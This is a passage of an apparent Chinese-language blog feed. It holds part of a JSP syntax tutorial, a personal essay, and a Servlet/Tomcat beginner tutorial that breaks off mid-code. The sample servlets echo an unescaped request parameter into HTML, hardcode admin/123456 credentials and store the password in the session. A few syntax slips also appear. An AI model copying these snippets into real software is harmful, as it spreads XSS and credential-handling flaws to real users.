(_jspx_page_context != null) _jspx_page_context.handlePageException(t);        else throw new ServletException(t);      &#125;    &#125; finally &#123;      _jspxFactory.releasePageContext(_jspx_page_context);    &#125;  &#125;&#125;</code></pre><h2 id="四、jsp-语法"><a href="#四、jsp-语法" class="headerlink" title="四、jsp 语法"></a><strong>四、jsp 语法</strong></h2><h3 id="1-指令元素"><a href="#1-指令元素" class="headerlink" title="1.指令元素"></a><strong>1.指令元素</strong></h3><p>用于从 jsp 发送一个信息到容器，比如设置全局变量，设置编码，引入包等</p><h4 id="1-page-指令"><a href="#1-page-指令" class="headerlink" title="1.page 指令"></a><strong>1.page 指令</strong></h4><p>page 中的常用属性：</p><p>(1) language &#x3D;   设置语言<br>(2) import    引入包<br>(3) session &#x3D; true&#x2F;false   是否在 jsp 页面获取 session 对象<br>(4) errorpage &#x3D; “相对页面”  当 jsp 页面出错时 跳转到指定的 jsp 页面（以 &#x2F;开头时 表示相对 web 根目录，如果不以 &#x2F; 开头则表示相对当前目录)<br>(5)contentType &#x3D; “text&#x2F;html;charset&#x3D;utf-8”  指定网页以什么方式显示<br>(6)pageEncoding &#x3D; “utf-8” 指定 servlet 引擎以什么方式翻译 jsp -&gt; servlet ，并指定网页的显示方式</p><h4 id="2-include-指令"><a href="#2-include-指令" class="headerlink" title="2.include 指令"></a><strong>2.include 指令</strong></h4><pre><code class="hljs">&lt;% @ include file = &quot;filename&quot;%&gt;</code></pre><p>该指令用于引入一个 jsp 文件，并能将 两个 jsp 文件翻译成一个 servlet 文件，所以也被称为静态引入</p><p><strong>注意：</strong></p><p>被引入的 jsp 页面只需保留 page 指令即可，其他的 <code>&lt;body&gt;</code> 等 <code>&lt;html&gt;</code> 标签需要删除</p><h4 id="3-taglib-指令"><a href="#3-taglib-指令" class="headerlink" title="3.taglib 指令"></a><strong>3.taglib 指令</strong></h4><p>这个指令允许在 jsp 页面使用自定义的标签</p><h3 id="2-脚本元素"><a href="#2-脚本元素" class="headerlink" title="2.脚本元素"></a><strong>2.脚本元素</strong></h3><p>脚本元素就是 java 片段</p><h4 id="1-scriplet"><a href="#1-scriplet" class="headerlink" title="1.scriplet"></a><strong>1.scriplet</strong></h4><pre><code class="hljs">&lt;% java 代码 %&gt;</code></pre><p><strong>比如：</strong></p><pre><code class="hljs">&lt;% int i = 90; %&gt;</code></pre><p><strong>注意：</strong></p><p>这个里面定义的是局部变量，如果想定义成为servlet 的成员变量的话，要使用下面介绍的 declareation</p><h4 id="2-表达式"><a href="#2-表达式" class="headerlink" title="2.表达式"></a><strong>2.表达式</strong></h4><pre><code class="hljs">&lt;%=java 表达式 %&gt;</code></pre><p><strong>例如：</strong></p><pre><code class="hljs">&lt;%=rs.getString(1) %&gt;</code></pre><p><strong>注意：</strong></p><p>表达式是没有分号的，带了分号的就是语句了</p><h4 id="3-delaeration-声明"><a href="#3-delaeration-声明" class="headerlink" title="3.delaeration 声明"></a><strong>3.delaeration 声明</strong></h4><pre><code class="hljs">&lt;%! 变量声明 %&gt;&lt;%! 函数声明 %&gt;</code></pre><p><strong>比如：</strong></p><pre><code class="hljs">&lt;%! int i = 900; %&gt;</code></pre><p><strong>再比如：</strong></p><pre><code class="hljs">&lt;%!     int jisuan(int num)&#123;    int result = 0;    for(int i =0;i&lt;num;i++)&#123;        result = result+i;    &#125;&#125;%&gt;</code></pre><p><strong>注意：</strong></p><p>定义函数的时候，不要使用 public xxx ，因为转化成 servlet 以后就会在函数内部再创建函数，然而这个是不合规范的</p><h3 id="3-动作元素"><a href="#3-动作元素" class="headerlink" title="3.动作元素"></a><strong>3.动作元素</strong></h3><p>这个实际上用的不是特别的多</p><p>就说几个：</p><h4 id="1-页面转发"><a href="#1-页面转发" class="headerlink" title="1. 页面转发"></a><strong>1. 页面转发</strong></h4><p><code>&lt;jsp:forward&gt;</code>  实现页面的转发</p><h4 id="补充：tomcat-的保护机制"><a href="#补充：tomcat-的保护机制" class="headerlink" title="补充：tomcat 的保护机制"></a><strong>补充：tomcat 的保护机制</strong></h4><p>我们一般不把jsp 页面都放在项目的 web 根路径下，因为这样所有的jsp 页面都能被访问到，这是非常危险的，解决办法就是将 jsp 页面放在 WEB-INF 目录(就类似于 servlet 文件放在 src 下面一样)，然后通过一个统一的入口访问，实现的方式就是通过转发、</p><h4 id="2-页面包含"><a href="#2-页面包含" class="headerlink" title="2. 页面包含"></a><strong>2. 页面包含</strong></h4><pre><code class="hljs">`&lt;jsp:include&gt;`</code></pre><p>这个页面的包含是动态包含，和上面讲过的静态包含不同的是，动态包含会生成两个 servlet 文件，并且包含过程中没有去除 <code>&lt;body&gt;</code> 等标签的要求</p><h3 id="4-jsp-的注释"><a href="#4-jsp-的注释" class="headerlink" title="4.jsp 的注释"></a><strong>4.jsp 的注释</strong></h3><h4 id="1-HTML-注释风格"><a href="#1-HTML-注释风格" class="headerlink" title="1.HTML 注释风格"></a><strong>1.HTML 注释风格</strong></h4><pre><code class="hljs">&lt;!-- 注释的内容 --&gt;</code></pre><h4 id="2-jsp-注释风格"><a href="#2-jsp-注释风格" class="headerlink" title="2.jsp 注释风格"></a><strong>2.jsp 注释风格</strong></h4><pre><code class="hljs">&lt;%-- --&gt;</code></pre><h3 id="5-jsp-九大内置对象"><a href="#5-jsp-九大内置对象" class="headerlink" title="5.jsp 九大内置对象"></a><strong>5.jsp 九大内置对象</strong></h3><h4 id="1-out-向客户端输出数据字节流"><a href="#1-out-向客户端输出数据字节流" class="headerlink" title="1. out 向客户端输出数据字节流"></a><strong>1. out 向客户端输出数据字节流</strong></h4><p>对应这 JspWriter</p><pre><code class="hljs">out.pritlen()</code></pre><h4 id="2-request-接受客户端的http请求"><a href="#2-request-接受客户端的http请求" class="headerlink" title="2.request 接受客户端的http请求"></a><strong>2.request 接受客户端的http请求</strong></h4><p>存放的数据在一次 request 请求中有效，对应着 servlet 中的 HttpServletRequest 类</p><h4 id="3-response-封装-jsp-产生的回应"><a href="#3-response-封装-jsp-产生的回应" class="headerlink" title="3.response 封装 jsp 产生的回应"></a><strong>3.response 封装 jsp 产生的回应</strong></h4><p>servlet 中的 HttpServletResponse 类</p><h4 id="4-session-用于保护用户的信息，跟踪用户的行为"><a href="#4-session-用于保护用户的信息，跟踪用户的行为" class="headerlink" title="4.session 用于保护用户的信息，跟踪用户的行为"></a><strong>4.session 用于保护用户的信息，跟踪用户的行为</strong></h4><p>存放的数据在一次回话中有效,对应着  HttpSession 这个类</p><h4 id="5-application-多个用户共享该对象，可用作计数器"><a href="#5-application-多个用户共享该对象，可用作计数器" class="headerlink" title="5.application 多个用户共享该对象，可用作计数器"></a><strong>5.application 多个用户共享该对象，可用作计数器</strong></h4><p>存放的数据在整个 web 应用运行期间有效</p><h4 id="6-pageContext-代表jsp-页面的上下文"><a href="#6-pageContext-代表jsp-页面的上下文" class="headerlink" title="6.pageContext 代表jsp 页面的上下文"></a><strong>6.pageContext 代表jsp 页面的上下文</strong></h4><p>放在 pageContext 的属性只在本页面生效,对应 PageContext</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Showtime&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;%    pageContext.setAttribute(&quot;abc&quot;,&quot;xxx&quot;);%&gt;&lt;%   String val = (String) pageContext.getAttribute(&quot;abc&quot;);   out.println(val);%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="7-exception-代表运行时的一个异常"><a href="#7-exception-代表运行时的一个异常" class="headerlink" title="7.exception 代表运行时的一个异常"></a><strong>7.exception 代表运行时的一个异常</strong></h4><p>使用较少,对应着 Exception</p><h4 id="8-page-代表-jsp-这个实例本身"><a href="#8-page-代表-jsp-这个实例本身" class="headerlink" title="8.page 代表 jsp 这个实例本身"></a><strong>8.page 代表 jsp 这个实例本身</strong></h4><p>相当于 servlet 的 this 使用较少</p><h4 id="9-config-代表-jsp-对应的-servlet-的配置"><a href="#9-config-代表-jsp-对应的-servlet-的配置" class="headerlink" title="9.config 代表 jsp 对应的 servlet 的配置"></a><strong>9.config 代表 jsp 对应的 servlet 的配置</strong></h4><p>对应着 ServletConfig</p>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>J2EE 基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>随笔杂谈</title>
    <link href="/2018/10/13/%E9%9A%8F%E7%AC%94%E6%9D%82%E8%B0%88/"/>
    <url>/2018/10/13/%E9%9A%8F%E7%AC%94%E6%9D%82%E8%B0%88/</url>
    
    <content type="html"><![CDATA[<h2 id="成者的三个要素"><a href="#成者的三个要素" class="headerlink" title="成者的三个要素"></a><strong>成者的三个要素</strong></h2><p>1.淡化“我”在行动中的地位，特别是不要让“我”的情绪对行动产生影响。<br>2.成功者往往在失败中看到的是新的机遇，而不是眼前的苟且与失败，并且总能将那种机遇变成现实。<br>3.身体要好，年轻时要注意保养。</p><p>纪念一下这些日因为没日没夜疯狂敲键盘差点报废了的手……以后要注意保养。</p><span id="more"></span><h2 id="请把眼光放高远"><a href="#请把眼光放高远" class="headerlink" title="请把眼光放高远"></a><strong>请把眼光放高远</strong></h2><p>什么动物最后意识到水的存在？答案是鱼，因为鱼一生都在水中，假设鱼有了鹰的视角，会不会对自己的所处有了新的认识呢？</p><h2 id="先自己"><a href="#先自己" class="headerlink" title="先自己"></a><strong>先自己</strong></h2><p>爱别人以前，请先学会爱自己，恨别人以前，请先想想自己有多傻逼。</p><h2 id="伪文青"><a href="#伪文青" class="headerlink" title="伪文青"></a><strong>伪文青</strong></h2><p>我喜欢 写诗、写歌词，因为能构造那些精妙的句子，我喜欢唱歌、素描，写字，因为能勾勒出绚丽的世界，我喜欢代码，安全，因为能变键盘为疆场，让大脑变武器。</p><p>我一直自诩为文青，却又沉迷于01世界，那就是个伪文青吧，但至少和纯理工男不一样。活泼中有理智，刚硬中泛柔情，我有我“自以为是”的风格，如果你只看到了任何一面，那只能说你没有彻底的认识我。</p><h2 id="何为残酷"><a href="#何为残酷" class="headerlink" title="何为残酷"></a><strong>何为残酷</strong></h2><p>可能还是太年轻，曾经对残酷的理解还是不够深刻，直到遇见了真正的残酷，遇见了真正的抉择的两难才知道什么是残酷，什么是人生。</p><p>没有什么是挺不过去的，我一直这样告诉自己：这20年来，经历过生死、经历过荣耀与屈辱，我依然能完好无损的站在这里，或与你谈笑风生，或与你严肃正经的讨论技术，我想我至少都不是一个失败者，而且我也有足够的毅力战胜眼前的一切，但后来我发现我最大的优点和缺点都是持之以恒。</p><p>最近经历了很多残酷的事，日子过得很艰难，不断地的挑战我的极限，我唯一能做的就是在极限被冲破之后知道自己的极限远不止如此。</p><p>如果说每天跑五公里很艰难的话，那么这仅仅是我面对的艰难的十分之一</p><p>听人说，只有当你敢把你的遭遇毫无保留的讲给别人听，敢直面眼前的困难而不是逃避的时候，你就又向你的成功迈进了一大步。</p><p>虽然我知道直面只能带来更多的痛苦，但我也不想选择逃避，因为我是个男人，不是个娘们！</p><h2 id="英雄论"><a href="#英雄论" class="headerlink" title="英雄论"></a><strong>英雄论</strong></h2><p>今天回宿舍的路上看到一个小男孩从用于连接挡车的石墩的铁链子上跳下，还摆出酷炫的动作，嘴里嘟囔着什么，一副拯救世界的样子。</p><p>其实，我们一生都在扮演英雄这个角色，从小时候幻想能做拯救世界的英雄，到后来幻想能成为他人的英雄，再到后来的想做自己的英雄，我们英雄越做越小，能力却越来越强，直到有一天，有一个人闯进你的世界，对你说：“你是我的英雄”，后来她(他)也成为你的英雄，然后你就会第一次发现，原来追逐一生的所谓英雄竟然如此。自己前半生所做的那些努力也不过是为了遇见那个愿意把你当做英雄的人而已，而其他的擦肩而过的种种，不必想，也不必追……</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>J2EE 基础（Servlet篇）</title>
    <link href="/2018/10/12/J2EE%E5%9F%BA%E7%A1%80%EF%BC%88Servlet%E7%AF%87%EF%BC%89/"/>
    <url>/2018/10/12/J2EE%E5%9F%BA%E7%A1%80%EF%BC%88Servlet%E7%AF%87%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="一、前置基础"><a href="#一、前置基础" class="headerlink" title="一、前置基础:"></a><strong>一、前置基础:</strong></h2><h3 id="1-谁是谁的基础："><a href="#1-谁是谁的基础：" class="headerlink" title="1.谁是谁的基础："></a><strong>1.谁是谁的基础：</strong></h3><p>java 基础 是 servlet 的基础 servlet 是 jsp 的基础，Java本身不适合web 开发，但是 servlet 可以做到，jsp 适合做页面</p><p>java –&gt; servlet –&gt; jsp </p><h3 id="2-常见的java服务器"><a href="#2-常见的java服务器" class="headerlink" title="2. 常见的java服务器"></a><strong>2. 常见的java服务器</strong></h3><p>JBOSS<br>WebLogic<br>Tomcat</p><span id="more"></span><h3 id="3-Tomcat-的目录结构"><a href="#3-Tomcat-的目录结构" class="headerlink" title="3.Tomcat 的目录结构"></a><strong>3.Tomcat 的目录结构</strong></h3><h4 id="1-bin"><a href="#1-bin" class="headerlink" title="1.bin:"></a><strong>1.bin:</strong></h4><p>主要负责 tomcat 的启动和停止（二进制核心文件）</p><h4 id="2-conf"><a href="#2-conf" class="headerlink" title="2.conf"></a><strong>2.conf</strong></h4><p>tomcat 的配置文件目录，奇珍有三个 xml 文件非常重要，分别是 server.xml 、 tomcat-users.xml 、 web.xml</p><p><strong>server.xml:</strong></p><p>主要用于配置和server 相关的信息，比如 tomcat 的启动端口以及 Host </p><p><strong>web.xml</strong></p><p>主要配置和 web 应用（web站点）相关的，比如我们规定hello.jsp 为网站的默认首页，我们就可以在这个页面里面加</p><pre><code class="hljs">&lt;welcome-file-list&gt;        &lt;welcome-file&gt;hello.jsp&lt;/welcome-file&gt;&lt;/welcome-file-list&gt;</code></pre><p><strong>Tomcat-users.xml</strong> </p><p>配置用户名密码和用户的权限，包括默认页面的manager</p><h4 id="3-lib"><a href="#3-lib" class="headerlink" title="3.lib"></a><strong>3.lib</strong></h4><p>该目录放置 tomcat 运行所需的 jar 包</p><h4 id="4-logs"><a href="#4-logs" class="headerlink" title="4.logs"></a><strong>4.logs</strong></h4><p>日志目录</p><h4 id="5-webapps"><a href="#5-webapps" class="headerlink" title="5.webapps"></a><strong>5.webapps</strong></h4><p>该目录下放置我们的web应用</p><h4 id="6-work-目录"><a href="#6-work-目录" class="headerlink" title="6.work 目录"></a><strong>6.work 目录</strong></h4><p>用于存放java 文件被访问后生成的 .class 和 servlet 文件</p><h3 id="4-web应用目录规范"><a href="#4-web应用目录规范" class="headerlink" title="4.web应用目录规范"></a><strong>4.web应用目录规范</strong></h3><p><strong>如下图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/javaweb%20%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" alt="此处输入图片的描述"></p><p>classes 目录存放的是 class文件，lib 目录存放的是该项目由需要的jar 文件</p><h3 id="5-Tomcat-虚拟目录"><a href="#5-Tomcat-虚拟目录" class="headerlink" title="5.Tomcat 虚拟目录"></a><strong>5.Tomcat 虚拟目录</strong></h3><p>如果我们的 webapps 所在的磁盘已经空间不足，那么我们能不能实现将web 应用放在别的地方但是还让tomcat 来管理呢？当然是可以的，我们这个时候就要配置虚拟目录</p><p>我们只要在 server.xml 里面的<code>&lt;HOST&gt;</code> 中间添加一个 <code>&lt;Context&gt;</code> 节点,格式如下：</p><pre><code class="hljs">&lt;Context docBase=&quot;E:\jspstudy\WWW&quot; path=&quot;&quot;&gt;&lt;/Context&gt;</code></pre><p>path 是待会要在url 中显示的那个目录，可以随意指定（视觉效果）<br>docBase 是绝对路径</p><p>当然除了这两个参数以外，还有两个参数需要了解一下</p><p>1.reloadable 这个参数设为true 以后 Tomcat 就会及时的发现文件的变化，然后更新，开销较大，建议只在开发时开启</p><p>2.upackWAR 这个参数设置为 true 以后我们通过tomcat 上传的 war 就能自动的解压，并放在webapps 目录下</p><blockquote><p><strong>注意：</strong></p><p>HOST 标签可以有很多个，有一个host就有一个虚拟主机</p></blockquote><h3 id="6-配置本地主机名（非必须）"><a href="#6-配置本地主机名（非必须）" class="headerlink" title="6.配置本地主机名（非必须）"></a><strong>6.配置本地主机名（非必须）</strong></h3><p>如果我们不想看到loclhost ,根据网页的请求原理，我们可以在本地的hosts 文件中配置主机名，配置好了以后可以在 server.xml 中 找到 HOST 标签修改 name 参数</p><h4 id="补充：tomcat-解析资源的流程"><a href="#补充：tomcat-解析资源的流程" class="headerlink" title="补充：tomcat 解析资源的流程"></a><strong>补充：tomcat 解析资源的流程</strong></h4><p>tomcat 拿到请求以后会先解析主机（一个tomcat 能管理多个主机），然后会解析web 应用，因为一个主机可能会有多个web 应用，就如我们之前说的可以设置，如下</p><pre><code class="hljs">&lt;Context docBase=&quot;E:\jspstudy\WWW&quot; path=&quot;&quot;&gt;&lt;/Context&gt;</code></pre><p>最后才是解析资源并获取资源</p><h3 id="7-tomcat-的体系结构"><a href="#7-tomcat-的体系结构" class="headerlink" title="7.tomcat 的体系结构"></a><strong>7.tomcat 的体系结构</strong></h3><p><strong>如图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Tomcat%20%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.png" alt="此处输入图片的描述"></p><p>在引擎(engine)中可以配置默认主机</p><h3 id="8-tomcat-和-servlet-在网络中的位置"><a href="#8-tomcat-和-servlet-在网络中的位置" class="headerlink" title="8.tomcat 和 servlet 在网络中的位置"></a><strong>8.tomcat 和 servlet 在网络中的位置</strong></h3><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/tomcat%20%E5%92%8C%20servlet%20%E5%9C%A8%E7%BD%91%E7%BB%9C%E4%B8%AD%E7%9A%84%E4%BD%8D%E7%BD%AE.png" alt="此处输入图片的描述"></p><h2 id="二、servlet-快速入门"><a href="#二、servlet-快速入门" class="headerlink" title="二、servlet 快速入门"></a><strong>二、servlet 快速入门</strong></h2><h3 id="1-开发-servlet-有三种方法"><a href="#1-开发-servlet-有三种方法" class="headerlink" title="1.开发 servlet 有三种方法"></a><strong>1.开发 servlet 有三种方法</strong></h3><p>(1)实现 servlet 接口<br>(2)继承 GeneraicServlet<br>(3)继承 HttpSerlvet</p><h4 id="1-通过实现-servlet-接口的方式实现"><a href="#1-通过实现-servlet-接口的方式实现" class="headerlink" title="1.通过实现 servlet 接口的方式实现"></a><strong>1.通过实现 servlet 接口的方式实现</strong></h4><p><strong>(1)步骤一</strong></p><p>下面的代码实际上是实现了一个接口，就是把所有的方法都实现了</p><p><strong>示例代码：</strong></p><pre><code class="hljs">package com.test;import javax.servlet.*;import javax.servlet.http.*;import java.io.*;class myServlet implements Servlet&#123;    //用于初始化 servlet,就是把 servlet 装载到内存中    //该函数只会被调用一次    public void init(ServletConfig config)            throws ServletException&#123;    &#125;    //得到 ServletConfig 对象    public ServletConfig getServletConfig()&#123;        return null;    &#125;    //该函数是服务函数，我们的业务逻辑代码写在这里    //浏览器每请求一次就会被调用一次    public void service(ServletRequest req,                        ServletResponse res)            throws ServletException,            java.io.IOException&#123;            System.out.println(&quot;hello,world&quot;);    &#125;    // 该函数得到 servlet 的配置信息    public java.lang.String getServletInfo()&#123;        return null;    &#125;    // 销毁 servlet  从内存中清除该servlet    public void destroy()&#123;    &#125;&#125;</code></pre><p><strong>(2)步骤二</strong></p><p>根据 servlet 的规范我们还要在 WEB-INF&#x2F;web.xml 中部署servlet </p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;web-app xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot;  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee                      http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;  version=&quot;3.0&quot;  metadata-complete=&quot;true&quot;&gt;  &lt;servlet&gt;&lt;servlet-name&gt;myServlet&lt;/servlet-name&gt;&lt;servlet-class&gt;com.test.myServlet&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt;        &lt;servlet-name&gt;myServlet&lt;/servlet-name&gt;        &lt;url-pattern&gt;/ABC&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;&lt;/web-app&gt;</code></pre><p><strong>解释：</strong></p><p><strong><code>&lt;servlet&gt;</code>标签下的子标签</strong></p><p>1.servlet-name 自定义该servlet 的名字，默认使用该servlet 的文件名<br>2.servlet-class 指明该 servlet 是放在哪个包下面的，形式：com.test.myServlet</p><p><strong><code>&lt;servlet-mapping&gt;</code>标签(servlet 的映射)下的子标签</strong></p><p>1.servlet-name 和上面的保持一致<br>2.url-pattern  是将来访问这个 servlet的URL 的一部分，默认是这个servlet 的名字 的资源名（当做出一个请求以后，首先找这个对应的，然后根据名字找到servlet文件）</p><p><strong>(3)步骤三</strong></p><p>因为我的web 目录是在 testweb ，于是我们访问  localhost:8080&#x2F;testweb&#x2F;ABC 就能在控制台输出 hello,world</p><p><strong>(4)步骤四</strong></p><p>现在我们想在网页上看到返回信息，而不是在控制台，那我们只要在 service 这个函数中使用 res.getWriter().println()方法</p><p><strong>示例代码：</strong></p><pre><code class="hljs">    //该函数是服务函数，我们的业务逻辑代码写在这里    //浏览器每请求一次就会被调用一次    public void service(ServletRequest req,                        ServletResponse res)            throws ServletException,            java.io.IOException&#123;        System.out.println(&quot;hello ,world&quot;);res.getWriter().println(&quot;hello ,world&quot;);    &#125;</code></pre><p><strong>补充：</strong></p><p>如果用 javac 去编译一个 java 文件，需要带上.（点号）</p><pre><code class="hljs">javac -d . 文件路径</code></pre><h3 id="2-servlet-的生命周期"><a href="#2-servlet-的生命周期" class="headerlink" title="2.servlet 的生命周期"></a><strong>2.servlet 的生命周期</strong></h3><p>1.当 servlet 第一次被调用的时候，会触发 init 函数，然后将servlet实例加载到内存，这个函数只会被调用一次</p><p>2.当第一次以后（包括第一次）就会去调用 service 函数，服务器已经将我们的请求变成一个对象传递给这个函数，并将返回结果以一个对象打包（当然还会对其进行解析，将必要的结果返回给浏览器）</p><p>3.当站点 reload 或者 服务器 restart 的时候 调用 destory 函数，销毁</p><h4 id="2-通过继承-GeneraicServlet-来实现"><a href="#2-通过继承-GeneraicServlet-来实现" class="headerlink" title="2.通过继承 GeneraicServlet 来实现"></a><strong>2.通过继承 GeneraicServlet 来实现</strong></h4><p>这个是因为觉得 servlet 实现五个方法比较烦，于是把其他四个不是很重要的方法隐藏了，就留了一个service </p><h4 id="3-通过继承-HttpServlet-来实现"><a href="#3-通过继承-HttpServlet-来实现" class="headerlink" title="3.通过继承 HttpServlet 来实现"></a><strong>3.通过继承 HttpServlet 来实现</strong></h4><p><strong>myHttpServlet.java</strong></p><pre><code class="hljs">package com.test;import javax.servlet.*;import javax.servlet.http.*;import java.io.*;public class myHttpServlet extends HttpServlet&#123;protected void doGet(HttpServletRequest req,                     HttpServletResponse resp)              throws ServletException,                     java.io.IOException&#123;//响应 get  方式的提交 resp.getWriter().println(&quot;调用 doGet 方法&quot;);   &#125;protected void doPost(HttpServletRequest req,                      HttpServletResponse resp)               throws ServletException,                      java.io.IOException&#123;//响应 post 方式的提交  resp.getWriter().println(&quot;调用 doPost 方法&quot;); &#125;&#125;</code></pre><p><strong>web.xml</strong></p><pre><code class="hljs">&lt;servlet&gt;&lt;servlet-name&gt;myHttpServlet&lt;/servlet-name&gt;&lt;servlet-class&gt;com.test.myHttpServlet&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt;    &lt;servlet-name&gt;myHttpServlet&lt;/servlet-name&gt;    &lt;url-pattern&gt;/myHttpServlet&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;</code></pre><h3 id="3-servlet-的一些细节"><a href="#3-servlet-的一些细节" class="headerlink" title="3.servlet 的一些细节"></a><strong>3.servlet 的一些细节</strong></h3><ol><li><p>servlet-mapping 和 servlet-name 并不是一一映射的关系，可以多个url 映射到一个 servlet 上</p></li><li><p>url-parttern 映射可以有多层，并且可以是文件名，比如说 hello.html  ，但是不要真的以为访问的是一个html</p></li><li><p>servlet 映射到 URL 也可以使用通配符，通配符只能有两种格式，一种就是：*.扩展名 另一种是 <code>/xxx/*</code>，这种通配可以起到屏蔽信息，或者统一报错回复上</p><p> <strong>注意：在匹配的时候参考的标准</strong><br> (1)如果同时匹配到多个，谁长得最像就是访问谁<br> (2)*.do 这种形式的优先级最低</p></li><li><p>servlet 是一个供 servlet 引擎（web服务器）调用的java 类，他不能独立运行，他的运行完全是由servlet 引擎控制和调度的</p></li><li><p>servlet 在被第一次调用后就加载到内存，然后内存中的 srvlert 就会对各个请求进行服务，不会重新创建，这也就是说 servlet   是单例，可能会出现线程安全问题(类变量)，于是应该加同步机制 synchromized(this){}</p></li><li><p><code>&lt;load-on-stratup&gt;</code> 配合线程 解决网站启动时初始化或者定时完成任务的问题</p></li></ol><p>我们在 web.xml 的servlet 标签中使用 </p><pre><code class="hljs">  &lt;servlet&gt;        &lt;servlet-name&gt;myServlet&lt;/servlet-name&gt;        &lt;servlet-class&gt;com.test2.myServlet&lt;/servlet-class&gt;        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;  &lt;/servlet&gt;</code></pre><p>这里的数字代表该servlet 的启动顺序</p><p>我们在 servlet 文件中 写上</p><pre><code class="hljs">    @Override    public void init() throws ServletException &#123;        super.init();        System.out.println(&quot;init 函数被调用 &quot;);    &#125;</code></pre><p>在启动服务的时候就会被调用，而不用特地的去访问这个servlet ，这就能完成一些类似数据库之类的东西的初始化操作</p><h3 id="3-servletConfig-对象"><a href="#3-servletConfig-对象" class="headerlink" title="3.servletConfig 对象"></a><strong>3.servletConfig 对象</strong></h3><p>在 servlet 的配置文件中可以使用 <code>&lt;init-param&gt;</code>标签为 servlet 配置一些初始化的参数</p><p>我们在 web.xml 这样写</p><pre><code class="hljs"> &lt;servlet&gt;        &lt;servlet-name&gt;ServletConfigTest&lt;/servlet-name&gt;        &lt;servlet-class&gt;com.test2.ServletConfigTest&lt;/servlet-class&gt;        &lt;init-param&gt;            &lt;param-name&gt;encoding&lt;/param-name&gt;            &lt;param-value&gt;utf-8&lt;/param-value&gt;        &lt;/init-param&gt;&lt;/servlet&gt;</code></pre><p>servlet 文件中就能用下面的语句去加载这个配置，这样就不是写死的了</p><pre><code class="hljs">response.getCharacterEncoding(this.getServletConfig().getInitParameter(&quot;encoding&quot;));</code></pre><p>当然上面的配置只是针对某一个 servlet 使用，如果想对多个 servlet 都应用的话我们可以</p><pre><code class="hljs">&lt;context-param&gt;    &lt;param-name&gt;&lt;/param-name&gt;    &lt;param-value&gt;&lt;/param-value&gt;&lt;/context-param&gt;</code></pre><h2 id="三、HttpServletResponse-详解"><a href="#三、HttpServletResponse-详解" class="headerlink" title="三、HttpServletResponse 详解"></a><strong>三、HttpServletResponse 详解</strong></h2><p>web 服务器收到客户端的 http 请求以后，会针对每一次请求创建一个代表请求的request 对象 和 代表相应的 response 对象，因此我们要获取客户机提交上来的数据只要找request 对象就可以了，如果我们想要向客户机输出数据只要找 response 对象就可以了</p><h3 id="1-getWriter-和-getOutputStream-的区别"><a href="#1-getWriter-和-getOutputStream-的区别" class="headerlink" title="1.getWriter() 和 getOutputStream() 的区别"></a><strong>1.getWriter() 和 getOutputStream() 的区别</strong></h3><p>1.getWriter() 得到的是 PrintWriter 对象，用于向客户机会送字符数据<br>2.getOutputStream() 得到的是 OutputStream对象，用于向客户机会送字符数据或者二进制数据</p><p><strong>注意：</strong></p><p>这两个流不能同时使用，因为一旦你在一个流中做出了返回，服务器就会去检测和这个 response 相关的流有没有关闭，如果没有关，则强制关闭，于是下一次再去接收相同的信息是接收不到的</p><h3 id="2-SendRedirect-重定向"><a href="#2-SendRedirect-重定向" class="headerlink" title="2.SendRedirect() 重定向"></a><strong>2.SendRedirect() 重定向</strong></h3><p>实际上这个重定向也是一个 get 请求，也就是说我们能通过？ 利用 get方式传参</p><p><strong>LoginCLServlet.java</strong></p><pre><code class="hljs">if(&quot;admin&quot;.equals(name) &amp;&amp; &quot;123456&quot;.equals(pass))&#123;            response.sendRedirect(&quot;/UserManager/MainFrameServlet?uname=&quot;+name);        &#125;else&#123;            response.sendRedirect(&quot;/UserLogin/LoginServlet&quot;);        &#125;</code></pre><p><strong>MainFrameServlet.java</strong></p><pre><code class="hljs"> protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;        response.setContentType(&quot;text/html;charset=utf-8&quot;);        PrintWriter out = response.getWriter();        String name = request.getParameter(&quot;uname&quot;);        out.println(&quot;欢迎&quot;+name+&quot;进入管理界面&lt;/br&gt;&quot;);        out.println(&quot;&lt;a href=&#39;/UserLogin/LoginServlet&#39;&gt;返回重新登陆&lt;/a&gt;&quot;);    &#125;</code></pre><p>当然这种方法只能传递字符串，不能传递对象，如果想传递对象可以用 session 的方式</p><h3 id="3-session-传参"><a href="#3-session-传参" class="headerlink" title="3.session 传参"></a><strong>3.session 传参</strong></h3><p><strong>LoginCLServlet.java</strong></p><pre><code class="hljs"> if(&quot;admin&quot;.equals(name) &amp;&amp; &quot;123456&quot;.equals(pass))&#123;            request.getSession().setAttribute(&quot;loginpass&quot;,pass);            response.sendRedirect(&quot;/UserManager/MainFrameServlet?uname=&quot;+name);        &#125;else&#123;            response.sendRedirect(&quot;/UserLogin/LoginServlet&quot;);        &#125;</code></pre><p><strong>MainFrameServlet.java</strong></p><pre><code class="hljs"> protected 